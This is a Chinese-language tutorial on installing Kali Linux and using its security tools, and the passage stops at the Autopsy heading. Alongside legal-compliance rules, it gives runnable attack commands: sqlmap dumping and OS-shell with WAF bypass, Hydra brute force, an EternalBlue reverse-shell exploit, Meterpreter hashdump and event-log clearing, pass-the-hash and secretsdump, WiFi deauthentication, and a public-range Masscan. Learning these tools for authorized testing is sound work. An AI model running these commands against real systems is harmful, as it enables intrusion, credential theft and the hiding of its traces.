# kali

## 安装

### wsl-kali

#### 完整默认工具集 - 覆盖绝大多数场景

和 Kali 官方桌面版预装的工具完全一致，覆盖 Web 渗透、内网测试、逆向分析、取证等绝大多数场景，适合有一定需求的用户：

```
sudo apt install -y kali-linux-default
```

#### 按专项场景安装工具集

如果只需要某一类工具，可单独安装对应分类包，常用分类如下：

| 工具集包名                       | 适用场景                                    |
| -------------------------------- | ------------------------------------------- |
| `kali-linux-web`                 | Web 渗透测试、漏洞扫描、前端安全工具        |
| `kali-linux-wireless`            | 无线安全、WiFi 破解、蓝牙渗透工具           |
| `kali-linux-forensics`           | 数字取证、数据恢复、日志分析工具            |
| `kali-linux-reverse-engineering` | 逆向工程、二进制分析、反编译工具            |
| `kali-linux-social`              | 社会工程学、钓鱼攻击相关工具                |
| `kali-linux-crypto`              | 密码学分析、加密 / 解密、哈希破解工具       |
| `kali-linux-database`            | 数据库渗透、SQL 注入、数据库审计工具        |
| `kali-linux-iot`                 | 物联网设备渗透、智能家居 / 工控设备测试工具 |
| `kali-linux-hardware`            | 硬件调试、固件分析、嵌入式设备测试工具      |

### 镜像文件

#### 下载文件

官方下载地址：[Kali Linux 官网](https://www.kali.org/get-kali/)

镜像类型选择：

- ISO 镜像：通用镜像，适用于虚拟机（VMware/VirtualBox）、物理机安装，需手动配置分区。
- 预构建虚拟机镜像（VMware/VirtualBox）：免手动安装，导入即可使用，适合快速部署。

镜像版本建议：选择 “Kali Linux 64-bit”（主流架构），优先下载最新稳定版。

**镜像校验**（防止篡改）：

```bash
# Linux/macOS 校验SHA256
sha256sum kali-linux-2024.1-amd64.iso
# Windows PowerShell 校验SHA256
Get-FileHash -Path .\kali-linux-2024.1-amd64.iso -Algorithm SHA256
```

对比官网公布的校验值，确认一致性。

#### 使用文件安装

##### 虚拟机安装（VirtualBox 示例）

1. 新建虚拟机：类型选 “Linux”，版本选 “Debian (64-bit)”。
2. 资源分配：内存≥2GB，虚拟硬盘≥20GB，挂载下载的 ISO 镜像。
3. 系统安装：启动虚拟机，按向导完成语言、时区、分区、用户设置，安装后重启。
4. 优化配置：安装增强工具提升交互体验：
```bash
sudo apt install virtualbox-guest-x11 -y
```
##### VMware 虚拟机优化
导入预构建镜像后，安装 VMware Tools：

```bash
sudo apt install open-vm-tools-desktop -y
```

##### 物理机安装

1. 制作启动盘：使用 Rufus/Etcher 将 ISO 镜像写入 U 盘，设置电脑从 U 盘启动。
2. 分区建议：单独划分`/boot`（≥200MB）、`/`（≥20GB）、`swap`（建议为内存 1-2 倍）分区。
3. 安装流程：按向导完成分区、用户配置，步骤与虚拟机安装一致。

## kali系统使用

### kali系统使用

#### 系统更新与维护

```bash
sudo apt update  # 更新软件源列表
sudo apt upgrade -y  # 更新已安装软件（保留配置）
sudo apt full-upgrade -y  # 全量升级（含内核等重大更新）
sudo apt autoremove -y  # 清理无用依赖
sudo apt autoclean -y  # 清理过期缓存包
sudo apt clean  # 清空所有下载的deb包缓存
```

版本升级（如从旧版本更新至最新版）：

```bash
sudo apt update && sudo apt full-upgrade -y
sudo do-release-upgrade
```

#### 用户与权限管理

| 操作                 | 命令示例                                                     |
| -------------------- | ------------------------------------------------------------ |
| 切换 root 权限       | `sudo -i`（输入当前用户密码）                                |
| 新建普通用户         | `sudo useradd -m -s /bin/bash 用户名`                        |
| 设置用户密码         | `sudo passwd 用户名`                                         |
| 添加 sudo 权限       | `sudo usermod -aG sudo 用户名`                               |
| 删除用户（含家目录） | `sudo userdel -r 用户名`                                     |
| 限制 sudo 权限       | `sudo visudo`（编辑文件，如：用户名 ALL=(ALL) /usr/bin/nmap） |

#### 网络配置

- 查看网络信息：`ip addr`（替代传统 ifconfig）。

- 设置静态 IP（以 eth0 网卡为例，编辑配置文件）：

```bash
sudo nano /etc/network/interfaces
```
添加以下内容：
```ini
auto eth0
iface eth0 inet static
address 192.168.1.100
netmask 255.255.255.0
gateway 192.168.1.1
dns-nameservers 8.8.8.8 114.114.114.114
```
- 重启网络服务：`sudo systemctl restart networking`。

**恢复动态 IP（DHCP）**：

编辑`/etc/network/interfaces`，修改为：

```ini
auto eth0
iface eth0 inet dhcp
```

**网络连通性测试**：

```bash
ping -c 4 8.8.8.8  # 测试通断（发送4个数据包）
traceroute 8.8.8.8  # 追踪路由路径
```

## kali工具使用
Kali Linux官方维护了超600款安全测试工具，覆盖渗透测试全生命周期，所有工具的使用必须严格遵循国家网络安全相关法律法规，**仅可在获得目标资产所有者书面正式授权的环境中使用**，严禁任何非授权的测试、攻击、数据窃取行为。以下为详细的使用规范与核心工具用法。

---

### 通用使用原则
#### 一、合规与伦理前置原则（最高优先级）
1.  **严格遵守法律法规**：必须严格遵守《中华人民共和国网络安全法》《中华人民共和国数据安全法》《中华人民共和国个人信息保护法》《中华人民共和国刑法》第285条、286条、287条等相关规定，以及目标属地的网络安全管理条例，严禁任何未经授权的网络扫描、渗透、攻击、数据窃取行为。
2.  **强制书面授权要求**：所有测试行为必须提前获取目标资产所有者/管理方的**书面正式授权文件**，明确约定测试的目标范围（IP段、域名、资产清单）、测试时间窗口、允许的测试动作、禁止的高风险操作、数据处理规则，严禁超范围、超时限、超权限测试。
3.  **伦理与责任边界**：禁止利用工具对关键信息基础设施、政务系统、医疗系统、教育系统等民生相关资产进行非授权测试；禁止利用工具制作、传播恶意代码，实施网络诈骗、钓鱼攻击等违法犯罪行为；测试过程中不得对目标系统造成业务中断、数据损坏、数据泄露等实质性损害。
4.  **操作溯源与留存**：全程留存测试操作日志、授权文件、测试报告，所有操作可追溯，严禁销毁、篡改操作记录；测试获取的目标敏感数据必须加密存储、脱敏处理，测试完成后按授权要求合规销毁，严禁泄露、传播、非法利用。

#### 二、环境准备与系统适配原则
1.  **系统预更新与源优化**：工具运行前必须完成系统与软件源更新，避免依赖缺失、版本不兼容问题，完整更新流程如下：
    
    ```bash
    # 1. 更新软件源索引
    sudo apt update
    # 2. 全量升级系统与已安装工具（含内核、核心依赖库）
    sudo apt full-upgrade -y
    # 3. 清理无用依赖与缓存，释放磁盘空间
    sudo apt autoremove -y && sudo apt autoclean -y
    ```
    优先使用Kali官方源或国内合规镜像源，严禁混用Debian、Ubuntu等其他发行版的软件源，避免造成系统依赖冲突、工具无法运行。
2.  **隔离测试环境要求**：所有工具必须在**隔离的测试环境**中运行，优先使用虚拟机（VMware/VirtualBox/WSL）、沙箱环境，严禁在生产环境主机直接运行高危工具；测试前必须对Kali系统创建快照，方便工具运行异常、系统崩溃时快速恢复。
3.  **资源适配配置**：根据工具类型分配足够的系统资源，例如密码破解工具需充足的CPU/GPU资源，流量分析工具需充足的内存与磁盘空间，避免因资源不足导致工具运行中断、数据丢失。

#### 三、权限管理与最小权限原则
1.  **权限分级使用**：区分工具的权限需求，遵循**最小权限原则**，严禁无差别使用root权限运行所有工具：
    - 必须root权限运行的场景：raw数据包发送/接收（端口扫描、流量抓包）、无线网卡监听模式开启、系统级端口（1-1024）监听、内核级工具运行、修改系统网络配置等。
    - 可普通用户运行的场景：Web指纹识别、字典生成、离线哈希分析、文档类工具、非特权端口的网络请求等。
2.  **root权限规范**：优先使用`sudo 工具命令`的方式临时获取root权限，而非长期使用`sudo -i`进入root环境操作，避免误操作导致系统损坏；禁止使用root账户直接登录图形化界面，降低恶意脚本、工具的风险影响范围。
3.  **精细化权限分配**：多用户场景下，通过`sudo visudo`配置精细化的sudo权限，仅给用户分配对应工作所需的工具执行权限，禁止给普通用户分配全量无限制sudo权限。

#### 四、依赖管理与故障排查原则
1.  **优先官方包管理**：Kali Linux的所有官方工具均已打包至apt软件源，优先使用`apt`包管理器安装、管理工具，严禁随意使用pip、gem、npm等语言包管理器全局安装工具，避免与系统依赖库产生版本冲突。
2.  **依赖缺失完整排查流程**：
    1.  确认工具包名：通过`apt search 工具名`或Kali官方工具库（https://www.kali.org/tools/）查询工具对应的官方包名，确认是否已安装。
    2.  安装缺失工具/依赖：执行`sudo apt install -y 工具包名`，若依赖损坏，执行`sudo apt -f install`修复破损依赖。
    3.  缺失文件定位：若提示缺少.so动态库或配置文件，通过`apt-file search 缺失文件名`查询文件对应的依赖包，执行安装。
    4.  动态链接库检查：通过`ldd $(which 工具名)`检查工具的动态链接库依赖，确认是否存在缺失的库文件。
    5.  包完整性校验：通过`dpkg -V 工具包名`校验已安装包的文件完整性，修复损坏的安装文件。
3.  **工具版本兼容**：若工具运行提示版本不兼容，优先通过Kali官方源升级工具，严禁手动下载第三方二进制文件替换系统工具，避免引入恶意代码或造成系统不稳定。

#### 五、帮助文档与使用规范原则
1.  **多维度帮助查询方式（按优先级排序）**：
    1.  简易参数查询：执行`工具名 -h`或`工具名 --help`，快速查看工具的核心参数、基础用法，其中`-h`为简易帮助，`--help`通常为完整帮助文档。
    2.  详细手册查询：执行`man 工具名`，查看工具的官方完整手册，包含参数详解、使用场景、示例、退出码、BUG说明等全量信息，按`q`退出手册页面。
    3.  内置文档查询：Kali所有工具的官方文档、示例配置、版权说明均存放于`/usr/share/doc/工具名/`目录下，可通过`cat`、`less`命令查看，部分工具包含示例脚本、字典文件、配置模板。
    4.  官方在线文档：通过Kali官方工具库（https://www.kali.org/tools/）查询工具的最新文档、更新日志、使用教程，适配最新版本的功能变化。
2.  **测试参数验证**：对高危工具（如漏洞利用、拒绝服务攻击工具），必须先在本地测试环境验证参数、测试效果，确认无异常风险后，再在授权目标环境执行，避免因参数错误导致目标系统故障。

#### 六、安全管控与事后清理原则
1.  **目标确认与风险控制**：执行工具前必须二次确认目标IP、域名、端口等信息，严禁因输入错误导致对非授权目标执行测试；对可能影响目标系统可用性的操作，必须提前与授权方确认，制定应急预案，避免造成业务中断。
2.  **自身系统安全加固**：Kali系统作为测试平台，需关闭不必要的系统服务、开启防火墙、定期更新系统补丁，设置高强度用户密码，禁止将Kali系统直接暴露在公网，避免被反向攻击、控制。
3.  **测试后清理与收尾**：测试完成后，按授权要求清理在目标系统中留下的测试痕迹、临时文件、后门程序；对测试过程中生成的敏感数据、日志文件进行加密归档或合规销毁；恢复目标系统至测试前的正常状态。

---

### 典型工具基础用法
以下工具按**渗透测试标准流程（PTES）** 分类排序，覆盖信息收集→Web渗透→密码破解→内网渗透→无线安全→逆向工程→数字取证全流程，均为Kali Linux官方维护的核心工具，默认预装于kali-linux-default工具集中。

#### 一、信息收集与网络扫描工具（渗透测试前置环节）
##### 1. Nmap（Network Mapper）
- **核心定位**：全球最主流的开源网络扫描器，核心功能包括主机发现、端口扫描、服务/版本识别、操作系统指纹识别、漏洞脚本扫描，是信息收集阶段的核心工具。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y nmap`
- **核心参数详解**
  | 功能模块       | 核心参数                   | 参数说明                                                     |
  | -------------- | -------------------------- | ------------------------------------------------------------ |
  | 主机发现       | `-sn`                      | 仅主机存活探测，不进行端口扫描，快速定位网段内存活主机       |
  |                | `-Pn`                      | 跳过主机存活检测，强制对目标进行扫描（目标禁ping时使用）     |
  |                | `-PE`                      | 使用ICMP Echo请求进行主机发现（默认方式）                    |
  | 端口扫描       | `-sS`                      | TCP SYN半开扫描（root默认方式），速度快、隐蔽性强，不易被日志记录 |
  |                | `-sT`                      | TCP全连接扫描（普通用户默认方式），结果准确，速度慢，会被目标日志记录 |
  |                | `-sU`                      | UDP端口扫描，用于探测DNS、SNMP、NTP等UDP服务                 |
  |                | `-p 端口范围`              | 指定扫描端口，示例：`-p 80`、`-p 1-65535`、`-p 80,443,3306`  |
  |                | `--top-ports 数量`         | 扫描最常用的N个端口，示例：`--top-ports 100`                 |
  | 服务与版本识别 | `-sV`                      | 探测目标端口运行的服务名称、版本号                           |
  |                | `--version-intensity 0-9`  | 版本探测强度，数字越大结果越准确，速度越慢，默认7            |
  | 操作系统识别   | `-O`                       | 探测目标主机的操作系统类型、版本、内核信息                   |
  | 脚本扫描引擎   | `--script=脚本类别/脚本名` | 调用NSE脚本执行扩展功能，核心类别：vuln（漏洞扫描）、safe（安全扫描）、exploit（漏洞利用） |
  | 扫描时序控制   | `-T0~-T5`                  | 扫描时序模板，T0（最慢，隐身）~T5（最快，激进），默认T3，内网推荐T4 |
  | 结果输出       | `-oN/-oX 文件名`           | 分别将结果输出至文本/XML文件，便于归档与二次分析             |
- **常用场景实战示例**
  1.  快速探测内网网段存活主机
      ```bash
      sudo nmap -sn 192.168.1.0/24 -oN live_hosts.txt
      ```
  2.  全端口TCP SYN扫描+服务版本+操作系统识别
      ```bash
      sudo nmap -sS -p 1-65535 -sV -O -T4 192.168.1.100 -oN full_scan.txt
      ```
  3.  目标禁ping时的Web服务端口扫描
      ```bash
      sudo nmap -Pn -sS -p 80,443,8080,8443 -sV --script=http-title 192.168.1.100
      ```
  4.  基础漏洞扫描（调用vuln类别脚本）
      ```bash
      sudo nmap -sV --script=vuln 192.168.1.100 -oN vuln_scan.txt
      ```
- **注意事项**：激进扫描极易触发目标防火墙、IDS/IPS告警，UDP扫描建议仅指定端口，避免全端口扫描耗时过长。

##### 2. Masscan
- **核心定位**：互联网级高速端口扫描器，支持6分钟扫完全部互联网IPv4地址，适用于大网段、大范围的快速端口探测，扫描速度远超Nmap。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y masscan`
- **核心参数与示例**
  - 核心参数：`-p 端口范围`（必填，指定扫描端口）、`--rate 数据包速率`（每秒发包数量，内网推荐1000，公网不超100000）、`-iL 目标文件`、`-oL/-oX 输出文件`、`--exclude 排除网段`。
  - 常用示例：
    ```bash
    # 内网B段快速全端口扫描
    sudo masscan -p 1-65535 172.16.0.0/16 --rate 10000 -oL masscan_result.txt
    # 公网Web端口大范围扫描
    sudo masscan -p 80,443,8080 110.0.0.0/8 --rate 50000 -oX masscan_web.xml
    ```
- **注意事项**：高速扫描会产生极大网络流量，极易触发安全告警，通常配合Nmap使用，先快速定位存活端口，再用Nmap做深度探测。

##### 3. Gobuster
- **核心定位**：高性能Web目录/文件、子域名爆破工具，Go语言开发，速度远超传统Dirb/Dirbuster，是Web目录枚举的首选工具。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y gobuster`
- **核心功能与示例**
  1.  目录/文件爆破模式（dir）
      - 核心参数：`-u 目标URL`、`-w 字典文件路径`（Kali默认字典存放于`/usr/share/wordlists/`）、`-x 文件后缀`、`-t 线程数`、`-k 跳过SSL证书验证`、`-o 输出文件`。
      - 常用示例：
        ```bash
        # 基础Web目录爆破，php/html后缀
        gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt -x php,html -t 50 -o dir_blast.txt
        # HTTPS站点爆破，跳过证书验证
        gobuster dir -u https://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -k -t 30
        ```
  2.  子域名爆破模式（dns）
      - 常用示例：
        ```bash
        gobuster dns -d example.com -w /usr/share/wordlists/amass/subdomains-top1million-5000.txt -r 8.8.8.8 -o subdomain_blast.txt
        ```

##### 4. WhatWeb
- **核心定位**：Web应用指纹识别工具，可快速识别目标网站的CMS类型、Web服务器、编程语言、框架、CDN、安全设备等指纹信息。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y whatweb`
- **常用示例**
  ```bash
  # 基础指纹识别
  whatweb http://192.168.1.100
  # 深度扫描+详细输出
  whatweb -a 3 -v http://example.com -o whatweb_result.txt
  # 批量识别URL列表
  whatweb -iL targets.txt -t 20
  ```

##### 5. Wireshark/Tshark
- **核心定位**：全球最主流的网络抓包与流量分析工具，Wireshark为图形化界面，Tshark为命令行版本，用于捕获、分析、过滤网络流量，排查网络问题、提取敏感数据、分析攻击流量。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y wireshark tshark`
- **核心用法示例**
  1.  Wireshark图形化基础用法
      - 启动命令：`sudo wireshark`
      - 操作流程：选择网卡→开始捕获→设置捕获/显示过滤器→停止捕获→分析数据包→保存抓包文件（.pcap/.pcapng）
      - 常用显示过滤器：`http`（过滤HTTP流量）、`ip.addr == 192.168.1.100`（过滤指定IP）、`tcp.port == 8080`（过滤指定端口）、`http.request.method == "GET"`（过滤GET请求）。
  2.  Tshark命令行常用示例
      ```bash
      # 捕获eth0网卡流量，保存至文件
      sudo tshark -i eth0 -w capture.pcap
      # 捕获指定IP和端口的流量，实时输出
      sudo tshark -i eth0 -f "host 192.168.1.100 and tcp port 80"
      # 从pcap文件中提取HTTP请求URL
      tshark -r capture.pcap -T fields -e http.request.full_uri
      ```

#### 二、Web渗透测试工具
##### 1. Burp Suite Community Edition
- **核心定位**：Web应用渗透测试的行业标准工具，集成代理抓包、漏洞扫描、重放攻击、爆破、编码解码等核心功能，社区版为Kali默认预装，专业版需单独授权。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y burpsuite`
- **核心功能模块与基础用法**
  1.  前置配置：浏览器代理设置
      - 启动Burp Suite，进入【Proxy】→【Options】，确认代理监听地址为127.0.0.1:8080
      - 浏览器安装FoxyProxy插件，配置代理指向127.0.0.1:8080，安装Burp Suite CA证书，实现HTTPS流量抓包。
  2.  核心模块用法
      - **Proxy模块**：核心抓包模块，【Intercept】为拦截开关，开启后可拦截浏览器所有HTTP/HTTPS请求，支持修改请求包后转发；【HTTP history】为历史请求记录，可查看所有抓包的请求与响应。
      - **Repeater模块**：请求重放模块，将Proxy拦截的请求发送至Repeater，可反复修改请求参数、重放请求，查看响应结果，用于手动测试SQL注入、XSS、越权等漏洞。
      - **Intruder模块**：自动化爆破模块，社区版限制线程数，用于账号密码爆破、参数遍历、目录爆破等测试，核心步骤：标记爆破位置→设置攻击类型→加载爆破字典→启动攻击，根据响应长度、状态码判断结果。
      - **Decoder模块**：编码解码工具，支持URL编码、Base64、HTML编码、十六进制、哈希计算等操作，用于处理请求中的加密、编码参数。
      - **Comparer模块**：数据包对比工具，用于对比两次请求的响应差异，常用于越权漏洞、验证码绕过测试。

##### 2. sqlmap
- **核心定位**：开源自动化SQL注入工具，支持几乎所有数据库类型与SQL注入类型，可自动检测、利用SQL注入漏洞，实现数据库拖库、提权、获取服务器权限等操作，是SQL注入测试的首选工具。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y sqlmap`
- **核心参数详解**
  
  | 参数分类     | 核心参数               | 参数说明                                                     |
  | ------------ | ---------------------- | ------------------------------------------------------------ |
  | 目标指定     | `-u "目标URL"`         | 带注入参数的目标URL，示例：`-u "http://192.168.1.100/index.php?id=1"` |
  |              | `-r 请求包文件`        | 从Burp导出的请求包中读取目标，适用于POST注入、Cookie注入、带Token的请求 |
  | 注入检测     | `--dbs`                | 检测注入漏洞，列出目标所有数据库                             |
  |              | `--tables`             | 列出指定数据库的所有数据表                                   |
  |              | `--columns`            | 列出指定数据表的所有字段                                     |
  |              | `--dump`               | 导出指定数据表的所有数据（拖库）                             |
  |              | `-D/-T/-C`             | 分别指定操作的数据库、数据表、字段                           |
  | 注入类型指定 | `--technique=注入类型` | 指定注入技术，B（布尔盲注）、E（报错注入）、U（联合查询）、S（堆叠注入）、T（时间盲注） |
  |              | `--dbms=数据库类型`    | 指定目标数据库类型，示例：mysql、mssql、oracle，减少检测时间 |
  | 权限与提权   | `--current-user`       | 获取当前数据库用户                                           |
  |              | `--is-dba`             | 检测当前用户是否为DBA管理员权限                              |
  |              | `--os-shell`           | 利用注入漏洞获取目标服务器系统Shell                          |
  | 绕过与优化   | `--random-agent`       | 随机化User-Agent，避免被WAF封禁                              |
  |              | `--tamper=脚本名`      | 调用tamper脚本对Payload变形，绕过WAF/IPS                     |
  |              | `--level 1-5`          | 注入检测等级，等级越高检测越深入，默认1                      |
- **常用场景实战示例**
  1.  GET型SQL注入基础检测
      ```bash
      sudo sqlmap -u "http://192.168.1.100/index.php?id=1" --random-agent
      ```
  2.  检测注入并获取所有数据库
      ```bash
      sudo sqlmap -u "http://192.168.1.100/index.php?id=1" --dbs --random-agent
      ```
  3.  导出指定数据库的用户表数据
      ```bash
      sudo sqlmap -u "http://192.168.1.100/index.php?id=1" -D test_db -T users --dump --random-agent
      ```
  4.  POST型SQL注入检测（Burp请求包读取）
      ```bash
      sudo sqlmap -r post.txt --dbs --random-agent
      ```
  5.  绕过WAF的注入检测
      ```bash
      sudo sqlmap -u "http://192.168.1.100/index.php?id=1" --tamper=space2comment,urlencode --random-agent
      ```
  6.  获取目标服务器系统Shell
      ```bash
      sudo sqlmap -u "http://192.168.1.100/index.php?id=1" --os-shell --random-agent
      ```
- **注意事项**：高风险Payload可能导致目标数据库锁表、业务中断，严禁在生产环境无限制使用；拖库数据必须按授权要求合规处理。

#### 三、密码破解与哈希分析工具
##### 1. Hydra
- **核心定位**：开源在线密码暴力破解工具，支持SSH、FTP、Telnet、MySQL、RDP、SMB、HTTP(S)等几乎所有主流协议，是在线密码破解的首选工具。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y hydra`
- **核心参数详解**
  | 核心参数                  | 参数说明                                                     |
  | ------------------------- | ------------------------------------------------------------ |
  | `-l 用户名`/`-L 用户字典` | 单个用户名/批量用户名字典                                    |
  | `-p 密码`/`-P 密码字典`   | 单个密码/批量密码字典，Kali默认大字典：`/usr/share/wordlists/rockyou.txt` |
  | `-t 线程数`               | 爆破线程数，默认16，内网推荐32                               |
  | `-o 输出文件`             | 保存爆破成功的结果                                           |
  | `-vV`                     | 详细输出模式，实时显示爆破进度                               |
  | `-f`                      | 找到第一组正确账号密码后立即停止爆破                         |
  | 协议名                    | 目标爆破协议，必填，位于命令最后，示例：ssh、ftp、mysql、rdp |
- **常用场景实战示例**
  1.  SSH服务账号密码爆破
      ```bash
      hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 32 -vV -o ssh_crack.txt -f
      ```
  2.  MySQL数据库密码爆破
      ```bash
      hydra -L users.txt -P pass.txt mysql://192.168.1.100:3306 -t 16 -vV
      ```
  3.  Windows RDP远程桌面密码爆破
      ```bash
      hydra -l administrator -P pass.txt rdp://192.168.1.100 -t 4 -vV -o rdp_crack.txt
      ```
  4.  Web表单POST登录爆破
      ```bash
      hydra -l admin -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=login failed" -vV
      ```

##### 2. Hashcat
- **核心定位**：世界上最快的GPU/CPU加速密码哈希破解工具，支持超300种哈希算法，包括MD5、SHA系列、NTLM、WPA/WPA2等，是离线哈希破解的行业标准工具。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y hashcat`
- **核心参数详解**
  | 核心参数          | 参数说明                                                     |
  | ----------------- | ------------------------------------------------------------ |
  | `-m 哈希类型编号` | 指定哈希算法编号，示例：0(MD5)、1000(NTLM)、22000(WPA/WPA2)、3200(BCrypt) |
  | `-a 攻击模式`     | 攻击模式，0（字典攻击）、3（掩码攻击），默认0                |
  | `-o 输出文件`     | 保存破解成功的结果                                           |
  | `--show`          | 查看已破解的哈希结果                                         |
  | `-w 工作负载`     | 工作负载等级1-4，等级越高速度越快，占用资源越多，默认2       |
- **常用场景实战示例**
  1.  MD5哈希字典破解
      ```bash
      hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -o md5_crack.txt
      ```
  2.  Windows NTLM哈希破解
      ```bash
      hashcat -m 1000 -a 0 ntlm_hash.txt /usr/share/wordlists/rockyou.txt -w 3
      ```
  3.  WPA/WPA2 WiFi握手包破解
      ```bash
      hashcat -m 22000 -a 0 wifi.hccapx /usr/share/wordlists/rockyou.txt -o wifi_crack.txt
      ```
  4.  8位纯数字掩码暴力破解
      ```bash
      hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d?d?d
      ```

##### 3. John the Ripper
- **核心定位**：开源离线密码哈希破解工具，简称John，支持多种操作系统、数据库、压缩包的密码哈希破解，操作简单，适配小众哈希格式，是Hashcat的补充工具。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y john`
- **常用示例**
  1.  Linux /etc/shadow密码哈希破解
      ```bash
      # 合并passwd和shadow文件
      unshadow /etc/passwd /etc/shadow > linux_hash.txt
      # 字典破解
      john linux_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
      # 查看破解结果
      john --show linux_hash.txt
      ```
  2.  ZIP/RAR压缩包密码破解
      ```bash
      # ZIP包破解
      zip2john test.zip > zip_hash.txt
      john zip_hash.txt --wordlist=pass.txt
      # RAR包破解
      rar2john test.rar > rar_hash.txt
      john rar_hash.txt --wordlist=pass.txt
      ```

#### 四、内网渗透与漏洞利用工具
##### 1. Metasploit Framework (MSF)
- **核心定位**：全球最主流的开源渗透测试与漏洞利用框架，集成数千个漏洞利用模块、Payload、后渗透模块，覆盖漏洞探测、利用、内网横向移动、权限提升、持久化控制全流程，是内网渗透的核心工具。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y metasploit-framework`
- **基础使用流程与核心命令**
  1.  启动MSF控制台
      ```bash
      sudo msfconsole
      ```
  2.  核心命令详解
      | 核心命令               | 命令说明                                                     |
      | ---------------------- | ------------------------------------------------------------ |
      | `search 关键词`        | 搜索对应模块，示例：`search ms17-010`、`search mysql`        |
      | `use 模块路径`         | 加载指定模块，示例：`use exploit/windows/smb/ms17_010_eternalblue` |
      | `show options`         | 查看当前模块需要配置的参数                                   |
      | `set 参数名 参数值`    | 设置模块参数，核心必配参数：RHOSTS（目标IP）、LHOST（攻击机IP） |
      | `show payloads`        | 查看当前模块支持的攻击载荷                                   |
      | `set PAYLOAD 载荷路径` | 设置指定攻击载荷，最常用：Meterpreter交互式Shell             |
      | `check`                | 检测目标是否存在对应漏洞，不执行利用                         |
      | `run/exploit`          | 执行漏洞利用                                                 |
      | `sessions`             | 查看当前获取的会话列表，`sessions -i 会话ID` 进入指定会话    |
      | `background`           | 将当前会话放入后台运行                                       |
  3.  Meterpreter核心后渗透命令
      | 命令              | 说明                              |
      | ----------------- | --------------------------------- |
      | `sysinfo`         | 查看目标系统信息                  |
      | `getuid`          | 查看当前运行的用户权限            |
      | `getsystem`       | 尝试提升至Windows System系统权限  |
      | `shell`           | 进入目标系统的CMD命令行Shell      |
      | `download/upload` | 从目标下载文件/向目标上传文件     |
      | `screenshot`      | 截取目标系统桌面截图              |
      | `hashdump`        | 导出目标系统Windows用户的NTLM哈希 |
      | `clearev`         | 清除目标系统的事件日志            |
- **经典实战示例（MS17-010永恒之蓝漏洞利用）**
  ```bash
  # 1. 加载漏洞利用模块
  use exploit/windows/smb/ms17_010_eternalblue
  # 2. 配置目标与攻击机IP
  set RHOSTS 192.168.1.100
  set LHOST 192.168.1.200
  # 3. 配置攻击载荷
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  # 4. 执行漏洞利用
  exploit
  # 5. 利用成功后自动进入Meterpreter会话，执行后渗透操作
  ```

##### 2. Impacket套件
- **核心定位**：Python编写的网络协议工具集，支持SMB、MSRPC、LDAP、Kerberos等Windows内网核心协议，用于内网信息收集、横向移动、权限提升，是内网渗透的必备工具集。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y impacket-scripts`
- **核心工具常用示例**
  1.  psexec.py：通过SMB协议获取Windows系统交互式Shell
      ```bash
      # 账号密码直接获取System权限Shell
      psexec.py administrator:Password123@192.168.1.100
      # 哈希传递（Pass-the-Hash）获取Shell，无需明文密码
      psexec.py administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
      ```
  2.  wmiexec.py：通过WMI协议获取Shell，隐蔽性更强，日志更少
      ```bash
      wmiexec.py administrator:Password123@192.168.1.100
      ```
  3.  secretsdump.py：导出Windows系统SAM哈希、域控NTDS.dit数据库
      ```bash
      # 导出本地用户哈希
      secretsdump.py administrator:Password123@192.168.1.100
      ```

#### 五、无线安全测试工具
##### Aircrack-ng套件
- **核心定位**：WiFi安全测试的核心工具集，支持无线网卡监听模式开启、WiFi数据包捕获、WPA/WPA2/WPA3握手包捕获、WiFi密码破解等功能。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y aircrack-ng`
- **核心工具与基础用法**
  1.  开启无线网卡监听模式
      ```bash
      # 查看无线网卡名称
      ip addr
      # 停止网卡冲突进程
      sudo airmon-ng check kill
      # 开启监听模式（wlan0为无线网卡名，开启后变为wlan0mon）
      sudo airmon-ng start wlan0
      ```
  2.  airodump-ng：扫描周边WiFi，捕获握手包
      ```bash
      # 扫描周边所有WiFi，获取BSSID、信道、ESSID名称
      sudo airodump-ng wlan0mon
      # 捕获指定WiFi的WPA/WPA2握手包
      sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wifi_capture wlan0mon
      ```
  3.  aireplay-ng：解除认证攻击，强制客户端重连，捕获握手包
      ```bash
      sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA wlan0mon
      ```
  4.  aircrack-ng：破解WPA/WPA2握手包
      ```bash
      sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wifi_capture-01.cap
      ```
  5.  关闭监听模式
      ```bash
      sudo airmon-ng stop wlan0mon
      sudo systemctl restart NetworkManager
      ```
- **注意事项**：仅可破解自己拥有所有权的WiFi，严禁对他人WiFi进行扫描、攻击、密码破解，否则涉嫌违法犯罪；需使用支持监听/注入模式的无线网卡。

#### 六、逆向工程与数字取证工具
##### 1. Ghidra
- **核心定位**：美国国家安全局（NSA）开源的跨平台逆向工程套件，支持反汇编、反编译、调试、脚本扩展，功能媲美商业逆向工具IDA，是Kali默认预装的逆向核心工具。
- **安装方式**：默认预装，手动安装命令：`sudo apt install -y ghidra`
- **基础用法**：启动命令`ghidra`→新建项目→导入待分析的二进制文件（EXE、DLL、ELF等）→打开CodeBrowser执行自动分析→查看反汇编代码、伪C代码，开展逆向分析、漏洞挖掘。

##### 2. Autopsy
